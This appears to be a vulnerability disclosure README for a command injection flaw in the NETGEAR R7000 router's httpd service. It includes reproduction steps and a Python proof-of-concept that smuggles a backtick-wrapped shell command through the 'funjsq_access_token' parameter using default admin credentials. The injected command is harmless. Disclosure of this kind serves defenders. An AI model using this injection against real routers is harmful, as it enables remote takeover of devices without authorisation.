# NETGEAR-R7000

>  NETGEAR Nighthawk Wireless Router R7000 httpd Command Injection Remote Code Execution Vulnerability
>
### Overview of the Vulnerability
There is a remote command injection vulnerability in the latest firmware version v1.0.11.208 of Nighthawk router R7000. The vulnerability exists in the httpd service. Request the "funjsq_access_token" parameter of the "funjsq_register.php" interface through POST, and execute any command.

### Steps to Reproduce
1.Access the http service of the router for login authentication;

2.On the basis of authentication, you construct a POST request and send it to the http server. Url = 'http://192.168.1.1:8080/funjsq_register.php' data = {"status": "123", "code": "123", "msg": "123", "funjsq_access_token": "touch /tmp/test.txt"}

3.Check whether the test.txt file has been created in the tmp directory through UART, etc.

### Proof of Concept
The screenshot below demonstrates the RCE in the application through the specified parameter:
![image](https://github.com/t0ptop/NETGEAR-R7000/assets/82027562/f576d655-ac3d-48f5-b655-07c6e4b04be7)
![image](https://github.com/t0ptop/NETGEAR-R7000/assets/82027562/80285c14-9fce-4997-ad6e-5d0330bdd73a)

### POC
```
import requests
import sys

def attack():
    # base64(name:passwd)
    base64 = 'YWRtaW46cGFzc3dvcmQ='
    header={
        'Host':'192.168.1.1:80',
        'Authorization': 'Basic ' + base64,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
    }

    data = {
        "status":"123",
        "code":"123",
        "msg":"123",
        "funjsq_access_token":"`touch /tmp/test.txt`"
    }
    urls = 'http://192.168.1.1:80/funjsq_register.php'
    try:
        ret = requests.post(url=urls,
                      headers=header,
                      json=data,
                      timeout=30,
                      )
    except Exception:
        return

if __name__ == "__main__":
    attack()
```

